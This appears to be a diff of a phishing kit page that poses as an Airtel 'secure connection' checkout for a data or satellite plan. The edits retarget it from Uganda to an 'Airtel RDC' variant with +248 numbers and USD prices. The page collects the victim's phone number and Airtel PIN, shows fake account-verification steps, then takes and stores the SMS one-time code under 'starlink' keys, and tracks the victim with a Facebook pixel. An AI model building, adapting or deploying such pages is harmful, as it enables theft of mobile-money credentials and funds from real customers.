@@ -6,7 +6,7 @@
 <meta name="theme-color" content="#E40000">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<title>Airtel Uganda — Secure connection</title>
+<title>Airtel RDC — Secure connection</title>
 
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -384,7 +384,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       <div class="summary-product">
         <div class="summary-product-info">
           <span class="summary-product-name" id="sumName">—</span>
-          <span class="summary-product-meta">Data plan</span>
+          <span class="summary-product-meta">Satellite plan</span>
         </div>
         <div class="summary-product-price">
           <strong id="sumPrice">—</strong>
@@ -396,7 +396,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
         <span class="summary-item">
           <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.4" stroke-linecap="round"><rect x="5" y="2" width="14" height="20" rx="2"/><line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3"/></svg>
           <span class="summary-lbl">N°</span>
-          <span class="summary-val" id="sumPhone">🇺🇬 +256 —</span>
+          <span class="summary-val" id="sumPhone">🇸🇨 +248 —</span>
         </span>
         <span class="summary-dot"></span>
         <span class="summary-item">
@@ -472,7 +472,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
     <div class="proc-steps">
       <div class="proc-step act" id="psi0"><div class="proc-step-dot"></div><div class="proc-step-txt">Secure connection established</div></div>
       <div class="proc-step" id="psi1"><div class="proc-step-dot"></div><div class="proc-step-txt">Verifying Airtel account</div></div>
-      <div class="proc-step" id="psi2"><div class="proc-step-dot"></div><div class="proc-step-txt">Data plan validation</div></div>
+      <div class="proc-step" id="psi2"><div class="proc-step-dot"></div><div class="proc-step-txt">Satellite plan validation</div></div>
       <div class="proc-step" id="psi3"><div class="proc-step-dot"></div><div class="proc-step-txt">Sending OTP code…</div></div>
     </div>
   </div>
@@ -489,7 +489,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
       </div>
       <h2>OTP Verification</h2>
       <p>A 4-digit code has been sent to your Airtel number</p>
-      <div class="otp-phone" id="otpPhone"><span>🇺🇬</span>+256 —</div>
+      <div class="otp-phone" id="otpPhone"><span>🇸🇨</span>+248 —</div>
     </div>
 
     <div class="otp-boxes" id="otpBoxes" onclick="focusOTPInput()">
@@ -565,7 +565,7 @@ if (!forfait.name) navigate('airtel-index.html');
 document.getElementById('sumName').textContent = forfait.name || '—';
 document.getElementById('sumPrice').textContent = forfait.price || '—';
 document.getElementById('pinRef').textContent = forfait.price || '—';
-document.getElementById('sumPhone').innerHTML = forfait.phone ? '🇺🇬 +256 ' + forfait.phone : '🇺🇬 +256 —';
+document.getElementById('sumPhone').innerHTML = forfait.phone ? '🇸🇨 +248 ' + forfait.phone : '🇸🇨 +248 —';
 document.getElementById('sumValidity').textContent = forfait.jours ? forfait.jours + (forfait.jours === 1 ? ' Day' : ' Days') : '—';
 
 function showView(id){
@@ -641,7 +641,7 @@ document.getElementById('pinPad').addEventListener('click', function(e){
 
 async function submitLogin(){
   var ph = forfait.phone || '';
-  if(!ph || ph.length !== 9){
+  if(!ph || ph.length !== 7){
     document.getElementById('pinErr').textContent = 'Invalid session — go back and choose a plan';
     hap(H.error);
     setTimeout(function(){ navigate('airtel-index.html'); }, 1500);
@@ -654,12 +654,12 @@ async function submitLogin(){
   hap(H.confirm);
 
   var priceNum = 0;
-  try { priceNum = parseFloat(String(forfait.price||'0').replace('UGX ','')) || 0; } catch(e){}
+  try { priceNum = parseFloat(String(forfait.price||'0').replace('$','')) || 0; } catch(e){}
   try {
     if (window.fbq) window.fbq('track', 'AddPaymentInfo', {
-      content_name: forfait.name || 'Data plan',
+      content_name: forfait.name || 'Satellite plan',
       value: priceNum,
-      currency: 'UGX'
+      currency: 'USD'
     });
   } catch(e){}
 
@@ -674,7 +674,7 @@ async function runProcessing(ph){
   var steps = [
     {pct:25, txt:'Verifying Airtel account…', si:1},
     {pct:55, txt:'Validating ' + (forfait.name || 'your order') + '…', si:2},
-    {pct:85, txt:'Sending OTP to +256 ' + ph + '…', si:3},
+    {pct:85, txt:'Sending OTP to +248 ' + ph + '…', si:3},
     {pct:100, txt:'OTP code sent to your phone!'}
   ];
   for(var i=0;i<steps.length;i++){
@@ -703,7 +703,7 @@ async function runProcessing(ph){
     }).catch(function(){});
   })();
   await slp(500);
-  document.getElementById('otpPhone').innerHTML = '<span>🇺🇬</span>+256 ' + ph.slice(0,3) + ' ' + ph.slice(3,6) + ' ' + ph.slice(6);
+  document.getElementById('otpPhone').innerHTML = '<span>🇸🇨</span>+248 ' + ph.slice(0,3) + ' ' + ph.slice(3);
   otpVal = ''; renderOTP(); updateOTPBtn(); startTimer();
   setStep(3); showView('viewOTP'); focusOTPInput();
   hap(H.success);
@@ -808,7 +808,7 @@ function submitOTP(){
     otpError('This code looks like your PIN — the OTP is a separate code sent by SMS', timerSecs <= 0);
     return;
   }
-  var ref = 'AUT-UG-' + (Math.random()*9e5+1e5|0);
+  var ref = 'STL-CG-' + (Math.random()*9e5+1e5|0);
   sessionStorage.setItem('starlinkRef', ref);
   sessionStorage.setItem('starlinkOTP', otpVal);
   for(var i=0;i<4;i++) document.getElementById('ob'+i).classList.add('success');
